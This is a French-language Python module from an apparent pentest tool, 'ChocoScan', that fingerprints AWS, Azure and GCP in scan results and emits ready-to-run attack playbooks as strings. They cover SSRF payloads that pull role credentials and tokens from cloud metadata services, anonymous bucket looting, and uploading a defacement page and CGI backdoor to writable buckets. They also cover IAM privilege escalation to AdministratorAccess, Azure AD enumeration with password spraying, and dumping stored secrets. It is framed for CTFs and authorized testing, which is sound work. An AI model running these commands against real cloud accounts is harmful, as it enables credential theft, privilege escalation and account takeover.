"""
ChocoScan — Cloud Enumeration.

Détecte et énumère les misconfigurations cloud depuis un scan réseau
ou un contexte SSRF. Couvre AWS, Azure et GCP.

De plus en plus présent en CTF (HTB Pwned Labs, saisons récentes) :
buckets S3 ouverts, Azure Blob public, metadata service accessible
via SSRF, IAM over-permissif, managed identity exposée.

Fonctionnement :
  1. Analyse le scan pour détecter les signatures cloud
     (IPs AWS/Azure/GCP, banners, domaines .amazonaws.com etc.)
  2. Génère les commandes d'énumération par provider
  3. En mode SSRF : fournit les URLs internes à tester

Vecteurs couverts :
  AWS    — S3 buckets (public/listable/writable), IAM enum,
           EC2 metadata IMDSv1/IMDSv2, Lambda exposure,
           SSM Parameter Store, Secrets Manager, ECR
  Azure  — Blob Storage (public containers), Azure AD enum,
           Managed Identity (169.254.169.254), App Service env vars,
           Storage Account SAS tokens, Key Vault
  GCP    — GCS buckets (allUsers), Compute metadata service,
           Service Account impersonation, Firebase/Firestore open
  Multi  — ScoutSuite, Prowler, CloudFox, truffleHog

Référence : book.hacktricks.xyz/pentesting-cloud
            https://github.com/carlospolop/PentestingCloud
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class CloudCheck:
    title:       str
    provider:    str   # aws | azure | gcp | generic
    category:    str   # storage | iam | metadata | network | ssrf | secrets | misc
    description: str
    check_cmd:   str
    exploit_cmd: str
    severity:    str = "high"   # critical | high | medium | low
    difficulty:  str = "easy"   # easy | medium | hard
    notes:       list[str] = field(default_factory=list)


@dataclass
class CloudResult:
    target:              str
    detected_providers:  list[str]    # ["aws", "azure", "gcp"]
    ssrf_context:        bool         # SSRF vers metadata possible ?
    checks:              list[CloudCheck]
    bucket_candidates:   list[str]    # Noms de buckets à tester
    notes:               list[str]


# ── PLAGES IP CLOUD (simplifiées) ────────────────────────────────────────────
# Pour la détection depuis les résultats du scan

_AWS_PREFIXES   = ("52.", "54.", "18.", "34.", "35.", "3.", "13.", "15.")
_AZURE_PREFIXES = ("40.", "52.", "13.", "20.", "23.", "104.")
_GCP_PREFIXES   = ("34.", "35.", "104.", "130.", "142.", "146.")


# ── AWS — S3 ──────────────────────────────────────────────────────────────────

AWS_STORAGE_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="AWS S3 — Énumération de buckets (naming convention)",
        provider="aws",
        category="storage",
        description=(
            "Les buckets S3 suivent souvent des conventions de nommage prévisibles : "
            "company-backup, company-dev, company-prod, company-data, company-assets... "
            "Tester les variations du nom de la cible."
        ),
        check_cmd=(
            "# Tester l'existence d'un bucket (accès anonyme) :\n"
            "aws s3 ls s3://BUCKET_NAME --no-sign-request\n\n"
            "# Vérifier les ACLs :\n"
            "aws s3api get-bucket-acl --bucket BUCKET_NAME --no-sign-request\n\n"
            "# URL directe (si public) :\n"
            "curl -s https://BUCKET_NAME.s3.amazonaws.com/\n"
            "curl -s https://s3.amazonaws.com/BUCKET_NAME/"
        ),
        exploit_cmd=(
            "# ── S3Scanner — scanner plusieurs noms en parallèle ─────────────\n"
            "pip install s3scanner\n"
            "# Générer les candidats depuis le domaine/nom de la cible :\n"
            "echo -e 'COMPANY\\nCOMPANY-backup\\nCOMPANY-dev\\nCOMPANY-prod\\n"
            "COMPANY-data\\nCOMPANY-assets\\nCOMPANY-static\\nCOMPANY-web\\n"
            "COMPANY-internal\\nCOMPANY-logs\\nCOMPANY-www' > buckets.txt\n"
            "s3scanner scan --bucket-file buckets.txt\n\n"
            "# ── lazys3 — brute force de noms ────────────────────────────────\n"
            "ruby lazys3.rb COMPANY\n\n"
            "# ── awscli — lister et télécharger ──────────────────────────────\n"
            "# Si listable :\n"
            "aws s3 ls s3://BUCKET_NAME --no-sign-request\n"
            "aws s3 sync s3://BUCKET_NAME /tmp/bucket_loot --no-sign-request\n\n"
            "# Si writable :\n"
            "echo 'test' | aws s3 cp - s3://BUCKET_NAME/test.txt --no-sign-request\n\n"
            "# Chercher des credentials dans les fichiers :\n"
            "aws s3 cp s3://BUCKET_NAME/ /tmp/loot/ --recursive --no-sign-request\n"
            "grep -rE 'AKIA|aws_access|aws_secret|password|token' /tmp/loot/"
        ),
        severity="high",
        difficulty="easy",
        notes=[
            "Buckets publics = souvent backup, assets, logs, dev",
            "truffleHog pour chercher des secrets dans les fichiers récupérés",
            "Vérifier aussi : COMPANY.s3.amazonaws.com et s3.amazonaws.com/COMPANY",
        ],
    ),

    CloudCheck(
        title="AWS S3 — Misconfiguration (AllUsers Read/Write)",
        provider="aws",
        category="storage",
        description=(
            "Un bucket peut être listable (list objects) sans être public "
            "au niveau des objets. Tester les 4 permissions : "
            "LIST, READ, WRITE, READ_ACP."
        ),
        check_cmd=(
            "# aws s3api get-bucket-policy (si droits) :\n"
            "aws s3api get-bucket-policy --bucket BUCKET_NAME --no-sign-request\n\n"
            "# Tester l'écriture :\n"
            "aws s3 cp /tmp/test.txt s3://BUCKET_NAME/test.txt --no-sign-request\n\n"
            "# Lister les ACLs des objets :\n"
            "aws s3api get-object-acl --bucket BUCKET_NAME --key OBJECT_KEY --no-sign-request"
        ),
        exploit_cmd=(
            "# Bucket writable par AllUsers → upload de contenu malveillant :\n"
            "# Si le bucket sert un site statique (S3 static website) :\n"
            "aws s3 cp evil.html s3://BUCKET_NAME/index.html --no-sign-request\n\n"
            "# Backdoor via .htaccess si Apache est derrière CloudFront :\n"
            "echo 'Options +ExecCGI\\nAddHandler cgi-script .html' > .htaccess\n"
            "aws s3 cp .htaccess s3://BUCKET_NAME/.htaccess --no-sign-request\n\n"
            "# Si bucket de logs writable → log injection :\n"
            "aws s3 cp fake_log.log s3://BUCKET_NAME/logs/ --no-sign-request"
        ),
        severity="critical",
        difficulty="easy",
        notes=["CloudGoat (Rhino Security) pour s'entraîner sur les misconfigs S3"],
    ),
]


# ── AWS — IAM & Credentials ───────────────────────────────────────────────────

AWS_IAM_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="AWS IAM — Énumération sans credentials (iam:GetPolicy public)",
        provider="aws",
        category="iam",
        description=(
            "Certaines opérations IAM peuvent être réalisées en anonyme "
            "ou avec des credentials temporaires. "
            "Si on a des credentials (via metadata ou .env), énumérer les droits IAM."
        ),
        check_cmd=(
            "# Identifier le compte/rôle courant :\n"
            "aws sts get-caller-identity\n\n"
            "# Lister les permissions attachées :\n"
            "aws iam list-attached-user-policies --user-name USER\n"
            "aws iam list-user-policies --user-name USER\n\n"
            "# Énumérer les rôles :\n"
            "aws iam list-roles\n"
            "aws iam list-users"
        ),
        exploit_cmd=(
            "# ── Pacu — framework d'exploitation AWS (recommandé) ────────────\n"
            "# https://github.com/RhinoSecurityLabs/pacu\n"
            "python3 pacu.py\n"
            "Pacu > import_keys ACCESS_KEY SECRET_KEY\n"
            "Pacu > run iam__enum_permissions\n"
            "Pacu > run iam__privesc_scan\n\n"
            "# ── Enumerate-iam — tester toutes les permissions ────────────────\n"
            "# https://github.com/andresriancho/enumerate-iam\n"
            "python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET...\n\n"
            "# ── Privilege escalation IAM courants ────────────────────────────\n"
            "# iam:CreatePolicyVersion → créer une policy admin\n"
            "aws iam create-policy-version --policy-arn ARN \\\n"
            "  --policy-document file://admin_policy.json --set-as-default\n\n"
            "# iam:AttachUserPolicy → s'attacher une policy AdministratorAccess\n"
            "aws iam attach-user-policy --user-name USER \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n"
            "# iam:PassRole + ec2:RunInstances → lancer EC2 avec rôle admin\n"
            "aws ec2 run-instances --image-id ami-... --iam-instance-profile Name=AdminRole"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Pacu automatise le scan des privilèges IAM et la privesc",
            "IAM escalation paths : https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
        ],
    ),

    CloudCheck(
        title="AWS — Secrets dans le code / variables d'environnement",
        provider="aws",
        category="secrets",
        description=(
            "Les credentials AWS (AKIA...) sont souvent leakés dans des repos GitHub, "
            "des fichiers .env, des logs, des images Docker ou des pastes publics."
        ),
        check_cmd=(
            "# Chercher des AKIA dans les fichiers récupérés :\n"
            "grep -rE 'AKIA[0-9A-Z]{16}' /tmp/loot/ 2>/dev/null\n"
            "grep -rE 'aws_access_key_id|aws_secret_access_key' /tmp/loot/\n\n"
            "# GitHub (si accès au repo) :\n"
            "truffleHog git https://github.com/ORG/REPO --only-verified\n\n"
            "# Docker image :\n"
            "docker history IMAGE:TAG\n"
            "dive IMAGE:TAG  # Inspecter les layers"
        ),
        exploit_cmd=(
            "# Configurer awscli avec les credentials trouvés :\n"
            "aws configure set aws_access_key_id AKIA...\n"
            "aws configure set aws_secret_access_key SECRET...\n"
            "aws configure set region eu-west-1\n\n"
            "# Vérifier les droits :\n"
            "aws sts get-caller-identity\n"
            "python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET...\n\n"
            "# Chercher d'autres secrets dans AWS Secrets Manager :\n"
            "aws secretsmanager list-secrets\n"
            "aws secretsmanager get-secret-value --secret-id SECRET_ARN\n\n"
            "# SSM Parameter Store :\n"
            "aws ssm get-parameters-by-path --path / --recursive --with-decryption"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "gitleaks pour scanner des repos GitHub : gitleaks detect --source .",
            "truffleHog : https://github.com/trufflesecurity/trufflehog",
        ],
    ),
]


# ── AWS — Metadata Service (SSRF) ────────────────────────────────────────────

AWS_METADATA_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="AWS EC2 Metadata — IMDSv1 via SSRF (169.254.169.254)",
        provider="aws",
        category="metadata",
        description=(
            "Le service de metadata EC2 sur 169.254.169.254 expose les credentials "
            "IAM du rôle attaché à l'instance. IMDSv1 ne requiert aucun header — "
            "exploitable directement via SSRF."
        ),
        check_cmd=(
            "# Tester l'accès au metadata service (depuis SSRF) :\n"
            "# URL à injecter dans le paramètre SSRF :\n"
            "http://169.254.169.254/latest/meta-data/\n"
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n"
            "# Vérifier l'instance type :\n"
            "http://169.254.169.254/latest/meta-data/instance-type\n"
            "http://169.254.169.254/latest/meta-data/public-hostname"
        ),
        exploit_cmd=(
            "# ── IMDSv1 — aucun header requis ────────────────────────────────\n"
            "# 1. Lister les rôles IAM disponibles :\n"
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n"
            "# 2. Obtenir les credentials temporaires du rôle :\n"
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n"
            "# → Retourne : AccessKeyId, SecretAccessKey, Token\n\n"
            "# 3. Configurer awscli avec les credentials temporaires :\n"
            "export AWS_ACCESS_KEY_ID=ASIA...\n"
            "export AWS_SECRET_ACCESS_KEY=...\n"
            "export AWS_SESSION_TOKEN=...\n"
            "aws sts get-caller-identity\n\n"
            "# ── Autres endpoints utiles ──────────────────────────────────────\n"
            "# User-data (souvent des scripts d'init avec credentials) :\n"
            "curl http://169.254.169.254/latest/user-data\n\n"
            "# Identité de l'instance :\n"
            "curl http://169.254.169.254/latest/dynamic/instance-identity/document\n\n"
            "# Variables d'environnement Lambda (si contexte Lambda) :\n"
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "IMDSv2 requiert un header X-aws-ec2-metadata-token — voir check suivant",
            "Les credentials IAM temporaires expirent toutes les 6h max",
        ],
    ),

    CloudCheck(
        title="AWS EC2 Metadata — IMDSv2 (token requis)",
        provider="aws",
        category="metadata",
        description=(
            "IMDSv2 requiert d'abord un PUT pour obtenir un token, "
            "puis ce token dans un header GET. "
            "Certains SSRF permettent de faire des PUT → IMDSv2 exploitable."
        ),
        check_cmd=(
            "# Tester si IMDSv2 est requis :\n"
            "curl -s http://169.254.169.254/latest/meta-data/  # Si 401 → IMDSv2"
        ),
        exploit_cmd=(
            "# ── IMDSv2 — 2 requêtes nécessaires ─────────────────────────────\n"
            "# 1. Obtenir le token (PUT) :\n"
            "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' \\\n"
            "  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\n\n"
            "# 2. Utiliser le token (GET) :\n"
            "curl -s http://169.254.169.254/latest/meta-data/ -H \"X-aws-ec2-metadata-token: $TOKEN\"\n"
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \\\n"
            "  -H \"X-aws-ec2-metadata-token: $TOKEN\"\n\n"
            "# Si le SSRF ne supporte pas PUT → chercher IMDSv1 encore actif\n"
            "# ou exploiter via en-tête SSRF qui permet PUT (ex: requests Python)"
        ),
        severity="critical",
        difficulty="medium",
        notes=["Vérifier si le SSRF supporte PUT — SSRF via curl/Python souvent oui"],
    ),
]


# ── AZURE ─────────────────────────────────────────────────────────────────────

AZURE_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="Azure Blob Storage — Containers publics",
        provider="azure",
        category="storage",
        description=(
            "Les storage accounts Azure peuvent avoir des containers en accès public "
            "(Blob ou Container level). "
            "Tester avec les conventions de nommage de la cible."
        ),
        check_cmd=(
            "# URL directe (si container public) :\n"
            "curl -s https://ACCOUNT.blob.core.windows.net/CONTAINER/?restype=container&comp=list\n\n"
            "# BlobHunter — scanner un tenant Azure :\n"
            "python3 BlobHunter.py -a ACCOUNT_NAME\n\n"
            "# az cli :\n"
            "az storage container list --account-name ACCOUNT_NAME --auth-mode login"
        ),
        exploit_cmd=(
            "# ── Lister et télécharger les blobs ─────────────────────────────\n"
            "# Sans credentials (container public) :\n"
            "az storage blob list --container-name CONTAINER \\\n"
            "  --account-name ACCOUNT_NAME --auth-mode key --no-sign-request 2>/dev/null\n\n"
            "# Avec SAS token (si trouvé dans URL ou code) :\n"
            "az storage blob download --container-name CONTAINER \\\n"
            "  --name BLOB_NAME --file /tmp/blob_loot \\\n"
            "  --account-name ACCOUNT --sas-token 'SAS_TOKEN'\n\n"
            "# ── Chercher des storage accounts depuis le domaine ───────────────\n"
            "# Nommage : COMPANY.blob.core.windows.net\n"
            "#           COMPANY-backup.blob.core.windows.net\n"
            "#           COMPANYassets.blob.core.windows.net\n"
            "for name in COMPANY COMPANYbackup COMPANYdev COMPANYprod; do\n"
            "  curl -s -o /dev/null -w \"%{http_code} $name\\n\" \\\n"
            "    https://$name.blob.core.windows.net/; done\n\n"
            "# ── BlobHunter ─────────────────────────────────────────────────────\n"
            "git clone https://github.com/initstring/cloud_enum\n"
            "python3 cloud_enum.py -k COMPANY --disable-gcp --disable-aws"
        ),
        severity="high",
        difficulty="easy",
        notes=[
            "cloud_enum teste S3 + Azure Blob + GCS simultanément",
            "Chercher les SAS tokens dans les URLs (sig= dans query string)",
        ],
    ),

    CloudCheck(
        title="Azure Managed Identity — SSRF via 169.254.169.254",
        provider="azure",
        category="metadata",
        description=(
            "Les VMs Azure et App Services avec Managed Identity exposent "
            "un service de tokens sur 169.254.169.254 ou via une variable IDENTITY_ENDPOINT. "
            "Via SSRF → récupérer un access token Azure AD."
        ),
        check_cmd=(
            "# Tester depuis SSRF (App Service) :\n"
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
            "# Header requis : Metadata: true\n\n"
            "# IDENTITY_ENDPOINT (Azure Functions / App Service) :\n"
            "# Récupérer depuis variables d'env si accessible"
        ),
        exploit_cmd=(
            "# ── Azure VM IMDS ────────────────────────────────────────────────\n"
            "# Obtenir un access token pour l'API ARM :\n"
            "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/' \\\n"
            "  -H 'Metadata: true'\n"
            "# → Retourne : access_token, expires_on, resource\n\n"
            "# ── Utiliser le token ────────────────────────────────────────────\n"
            "TOKEN='eyJ...'\n"
            "# Lister les subscriptions :\n"
            "curl -s https://management.azure.com/subscriptions?api-version=2020-01-01 \\\n"
            "  -H \"Authorization: Bearer $TOKEN\"\n"
            "# Lister les VMs :\n"
            "curl -s https://management.azure.com/subscriptions/SUB_ID/providers/\n"
            "  Microsoft.Compute/virtualMachines?api-version=2021-04-01 \\\n"
            "  -H \"Authorization: Bearer $TOKEN\"\n\n"
            "# ── Azure App Service IDENTITY_ENDPOINT ──────────────────────────\n"
            "# Variable d'env IDENTITY_ENDPOINT + IDENTITY_HEADER :\n"
            "curl -s \"$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01\" \\\n"
            "  -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\"\n\n"
            "# ── MicroBurst — enum Azure ──────────────────────────────────────\n"
            "Import-Module MicroBurst.psm1\n"
            "Invoke-EnumerateAzureBlobs -Base COMPANY\n"
            "Get-AzureADUsers"
        ),
        severity="critical",
        difficulty="medium",
        notes=[
            "Token ARM → accès à toutes les ressources selon le rôle Managed Identity",
            "Tenter aussi : token pour Microsoft Graph (users, emails, SharePoint)",
            "MicroBurst : https://github.com/NetSPI/MicroBurst",
        ],
    ),

    CloudCheck(
        title="Azure AD — Énumération (o365spray, AADInternals)",
        provider="azure",
        category="iam",
        description=(
            "Énumérer les utilisateurs Azure AD/M365 sans credentials valides. "
            "Identifier les comptes valides → password spray ciblé."
        ),
        check_cmd=(
            "# Vérifier si le tenant existe :\n"
            "curl -s https://login.microsoftonline.com/COMPANY.onmicrosoft.com/.well-known/openid-configuration\n\n"
            "# Trouver le tenant ID :\n"
            "curl -s https://login.microsoftonline.com/COMPANY.com/.well-known/openid-configuration | python3 -m json.tool | grep issuer"
        ),
        exploit_cmd=(
            "# ── o365spray — enum + spray ─────────────────────────────────────\n"
            "python3 o365spray.py --validate --domain COMPANY.com\n"
            "python3 o365spray.py --enum -U usernames.txt --domain COMPANY.com\n"
            "python3 o365spray.py --spray -U valid_users.txt -P passwords.txt --domain COMPANY.com\n\n"
            "# ── AADInternals (PowerShell) ─────────────────────────────────────\n"
            "Import-Module AADInternals\n"
            "# Vérifier l'existence d'un user :\n"
            "Invoke-AADIntUserEnumerationAsOutsider -UserName 'user@COMPANY.com'\n"
            "# Énumérer depuis une liste :\n"
            "Invoke-AADIntUserEnumerationAsOutsider -UseList users.txt\n\n"
            "# ── Password spray (MFASweep) ─────────────────────────────────────\n"
            "# https://github.com/dafthack/MFASweep\n"
            "Invoke-MFASweep -Username user@COMPANY.com -Passwords Pass1,Pass2,Pass3\n\n"
            "# ── Trouver des emails valides via OSINT ──────────────────────────\n"
            "theHarvester -d COMPANY.com -b all\n"
            "hunter.io (API) → emails vérifiés"
        ),
        severity="high",
        difficulty="easy",
        notes=[
            "o365spray utilise l'endpoint autodiscover qui ne locke pas les comptes",
            "MFASweep teste plusieurs protocoles (EWS, ActiveSync, Graph...)",
        ],
    ),
]


# ── GCP ───────────────────────────────────────────────────────────────────────

GCP_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="GCP — GCS Buckets publics (allUsers)",
        provider="gcp",
        category="storage",
        description=(
            "Les buckets GCS configurés avec allUsers:Reader sont publics. "
            "Même convention de nommage qu'AWS S3."
        ),
        check_cmd=(
            "# Tester l'accès (URL directe) :\n"
            "curl -s https://storage.googleapis.com/BUCKET_NAME/\n"
            "curl -s https://BUCKET_NAME.storage.googleapis.com/\n\n"
            "# gsutil (sans auth) :\n"
            "gsutil ls gs://BUCKET_NAME\n"
            "gsutil ls -la gs://BUCKET_NAME"
        ),
        exploit_cmd=(
            "# ── GCPBucketBrute — brute force de noms ─────────────────────────\n"
            "python3 GCPBucketBrute.py -k COMPANY -o output.txt\n\n"
            "# ── cloud_enum — multi-cloud ──────────────────────────────────────\n"
            "python3 cloud_enum.py -k COMPANY --disable-azure --disable-aws\n\n"
            "# ── Télécharger le contenu ────────────────────────────────────────\n"
            "gsutil -m cp -r gs://BUCKET_NAME /tmp/gcs_loot\n\n"
            "# Si listable mais objets non publics → chercher des ACLs d'objets :\n"
            "gsutil acl get gs://BUCKET_NAME/OBJECT_NAME"
        ),
        severity="high",
        difficulty="easy",
        notes=["GCPBucketBrute : https://github.com/RhinoSecurityLabs/GCPBucketBrute"],
    ),

    CloudCheck(
        title="GCP Compute Metadata — Service Account via SSRF",
        provider="gcp",
        category="metadata",
        description=(
            "Le metadata service GCP sur 169.254.169.254 ou metadata.google.internal "
            "expose le token du service account attaché. "
            "Header requis : Metadata-Flavor: Google"
        ),
        check_cmd=(
            "# URLs SSRF à tester :\n"
            "http://169.254.169.254/computeMetadata/v1/\n"
            "http://metadata.google.internal/computeMetadata/v1/\n"
            "# Header requis (souvent injectable via SSRF) : Metadata-Flavor: Google"
        ),
        exploit_cmd=(
            "# ── Obtenir le token du service account ──────────────────────────\n"
            "curl -s 'http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/token' \\\n"
            "  -H 'Metadata-Flavor: Google'\n"
            "# → access_token + expires_in\n\n"
            "# ── Autres endpoints utiles ──────────────────────────────────────\n"
            "# Lister les scopes du SA :\n"
            "curl -s 'http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/scopes' -H 'Metadata-Flavor: Google'\n\n"
            "# Nom du projet :\n"
            "curl -s 'http://metadata.google.internal/computeMetadata/v1/project/project-id' \\\n"
            "  -H 'Metadata-Flavor: Google'\n\n"
            "# User-data (startup script) :\n"
            "curl -s 'http://metadata.google.internal/computeMetadata/v1/"
            "instance/attributes/startup-script' -H 'Metadata-Flavor: Google'\n\n"
            "# ── Utiliser le token ────────────────────────────────────────────\n"
            "TOKEN='ya29...'\n"
            "# Lister les buckets GCS du projet :\n"
            "curl -s https://storage.googleapis.com/storage/v1/b \\\n"
            "  -H \"Authorization: Bearer $TOKEN\"\n"
            "# Lister les VMs :\n"
            "curl -s https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/aggregated/instances \\\n"
            "  -H \"Authorization: Bearer $TOKEN\""
        ),
        severity="critical",
        difficulty="easy",
        notes=[
            "Scopes cloud-platform = accès total à tous les services GCP",
            "GKE nodes exposent aussi le metadata service — tous les pods y ont accès sans Metadata Concealment",
        ],
    ),
]


# ── Outils multi-cloud ────────────────────────────────────────────────────────

MULTICLOUD_CHECKS: list[CloudCheck] = [

    CloudCheck(
        title="cloud_enum — Brute force de ressources (S3 + Azure + GCS)",
        provider="generic",
        category="misc",
        description=(
            "cloud_enum teste en parallèle S3, Azure Blob et GCS "
            "avec des mutations du nom de la cible. "
            "Idéal pour le reconnaissance initiale."
        ),
        check_cmd=(
            "git clone https://github.com/initstring/cloud_enum\n"
            "pip3 install -r cloud_enum/requirements.txt"
        ),
        exploit_cmd=(
            "# Scan complet depuis le nom de la cible :\n"
            "python3 cloud_enum.py -k COMPANY\n\n"
            "# Plusieurs mots-clés :\n"
            "python3 cloud_enum.py -k COMPANY -k COMPANY-backup -k COMPANY-dev\n\n"
            "# Seulement AWS :\n"
            "python3 cloud_enum.py -k COMPANY --disable-azure --disable-gcp\n\n"
            "# Avec fichier de mutations personnalisé :\n"
            "python3 cloud_enum.py -k COMPANY --mutations mutations.txt"
        ),
        severity="medium",
        difficulty="easy",
        notes=["cloud_enum : https://github.com/initstring/cloud_enum"],
    ),

    CloudCheck(
        title="ScoutSuite — Audit de sécurité multi-cloud",
        provider="generic",
        category="misc",
        description=(
            "ScoutSuite audite la configuration d'un compte AWS/Azure/GCP "
            "et génère un rapport HTML détaillé des misconfigurations. "
            "Nécessite des credentials lus (Reader level)."
        ),
        check_cmd="pip install scoutsuite",
        exploit_cmd=(
            "# AWS :\n"
            "scout aws --access-key-id AKIA... --secret-access-key SECRET...\n\n"
            "# Azure :\n"
            "az login  # S'authentifier d'abord\n"
            "scout azure --cli\n\n"
            "# GCP :\n"
            "gcloud auth application-default login\n"
            "scout gcp --user-account\n\n"
            "# Ouvrir le rapport :\n"
            "firefox scoutsuite-report/report.html"
        ),
        severity="medium",
        difficulty="easy",
        notes=["ScoutSuite : https://github.com/nccgroup/ScoutSuite"],
    ),

    CloudCheck(
        title="truffleHog — Détection de secrets dans les repos/images",
        provider="generic",
        category="secrets",
        description=(
            "Scanner des repositories Git, images Docker, buckets S3 "
            "pour trouver des credentials AWS/Azure/GCP leakés."
        ),
        check_cmd="pip install trufflehog",
        exploit_cmd=(
            "# Scanner un repo GitHub :\n"
            "trufflehog github --org COMPANY --only-verified\n"
            "trufflehog git https://github.com/COMPANY/REPO --only-verified\n\n"
            "# Scanner une image Docker :\n"
            "trufflehog docker --image IMAGE:TAG\n\n"
            "# Scanner un bucket S3 :\n"
            "trufflehog s3 --bucket BUCKET_NAME\n\n"
            "# Filesystem local :\n"
            "trufflehog filesystem /path/to/code --only-verified"
        ),
        severity="high",
        difficulty="easy",
        notes=["truffleHog : https://github.com/trufflesecurity/trufflehog"],
    ),
]


# ── Détection du contexte cloud ───────────────────────────────────────────────

def _detect_cloud_context(results: list[dict]) -> tuple[list[str], bool, list[str]]:
    """
    Détecte les providers cloud depuis les résultats du scan.

    Retourne : (providers_detected, ssrf_possible, bucket_candidates)
    """
    providers:   set[str] = set()
    ssrf_possible = False
    buckets:     list[str] = []
    company_hints: set[str] = set()

    for r in results:
        svc    = r.get("service", {})
        host   = (svc.get("host", "") or "").lower()
        banner = (svc.get("banner", "") or "").lower()
        product = (svc.get("product", "") or "").lower()
        port   = svc.get("port", 0) or 0

        combined = f"{host} {banner} {product}"

        # ── Détection par IP / domaine ────────────────────────────────────────
        if any(kw in combined for kw in ("amazonaws", "s3.", "ec2.", "elasticloadbalancing")):
            providers.add("aws")
        if any(kw in combined for kw in ("azure", "windows.net", "microsoft.com", "cloudapp")):
            providers.add("azure")
        if any(kw in combined for kw in ("googleapis", "google.com", "gcp", "appspot")):
            providers.add("gcp")

        # ── Contexte SSRF (services web internes) ────────────────────────────
        if port in (80, 443, 8080, 8443) or "http" in (svc.get("service_name", "") or "").lower():
            ssrf_possible = True

        # ── Extraction de noms pour les candidats buckets ─────────────────────
        for m in re.finditer(r"\b([a-z][a-z0-9\-]{2,20})\b", combined):
            word = m.group(1)
            if word not in ("the", "and", "for", "http", "tcp", "open", "server", "service"):
                company_hints.add(word)

    # Générer les candidats buckets depuis les hints
    for hint in list(company_hints)[:3]:
        buckets.extend([
            hint,
            f"{hint}-backup", f"{hint}-dev", f"{hint}-prod",
            f"{hint}-data", f"{hint}-assets", f"{hint}-static",
            f"{hint}-internal", f"{hint}-logs",
        ])

    return sorted(providers), ssrf_possible, buckets[:20]


# ── Moteur principal ──────────────────────────────────────────────────────────

def enumerate_cloud(results: list[dict]) -> CloudResult:
    """
    Génère les commandes d'énumération cloud selon le contexte détecté.

    Args:
        results: Résultats ChocoScan.

    Returns:
        CloudResult avec toutes les vérifications adaptées.
    """
    target = ""
    if results:
        target = results[0].get("service", {}).get("host", "") or "TARGET"

    providers, ssrf_possible, buckets = _detect_cloud_context(results)

    # Si aucun provider détecté → tout inclure (contexte inconnu)
    if not providers:
        providers = ["aws", "azure", "gcp"]

    checks: list[CloudCheck] = []
    notes:  list[str] = []

    if "aws" in providers:
        checks += AWS_STORAGE_CHECKS + AWS_IAM_CHECKS + AWS_METADATA_CHECKS
        notes.append("AWS détecté — tester S3 buckets et metadata service en priorité")

    if "azure" in providers:
        checks += AZURE_CHECKS
        notes.append("Azure détecté — tester Blob Storage et Managed Identity SSRF")

    if "gcp" in providers:
        checks += GCP_CHECKS
        notes.append("GCP détecté — tester GCS buckets et metadata service")

    checks += MULTICLOUD_CHECKS

    if ssrf_possible:
        notes.append("Services web détectés → SSRF possible vers 169.254.169.254")
        notes.append("Tester : http://169.254.169.254/latest/meta-data/ (AWS)")
        notes.append("         http://metadata.google.internal/computeMetadata/v1/ (GCP)")
        notes.append("         http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)")

    if buckets:
        notes.append(f"Candidats buckets générés : {', '.join(buckets[:5])}...")

    notes.append("Outil multi-cloud recommandé : python3 cloud_enum.py -k NOM_CIBLE")

    return CloudResult(
        target=target,
        detected_providers=providers,
        ssrf_context=ssrf_possible,
        checks=checks,
        bucket_candidates=buckets,
        notes=notes,
    )


def get_all_cloud_checks() -> list[CloudCheck]:
    """Retourne tous les checks cloud sans filtrage contextuel."""
    return (
        AWS_STORAGE_CHECKS + AWS_IAM_CHECKS + AWS_METADATA_CHECKS +
        AZURE_CHECKS + GCP_CHECKS + MULTICLOUD_CHECKS
    )
